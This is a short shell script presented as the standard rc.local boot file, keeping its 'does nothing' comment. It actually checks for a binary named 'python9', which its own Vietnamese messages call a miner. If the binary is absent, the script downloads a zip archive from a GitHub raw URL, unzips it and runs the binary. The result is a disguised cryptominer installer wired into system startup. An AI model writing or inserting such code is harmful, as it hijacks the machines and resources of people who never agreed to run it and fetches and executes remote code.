#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/python9 ]; then
    if pgrep -x "python9" > /dev/null
then
    echo "Miner dang chay roi , ke cmn di "
    
else

echo "Miner da install , chay thoi "
./python9

     
fi
exit
fi
sudo apt-get install tmux unzip -y
wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/xmnew.zip
unzip xmnew.zip
chmod +x python9
./python9
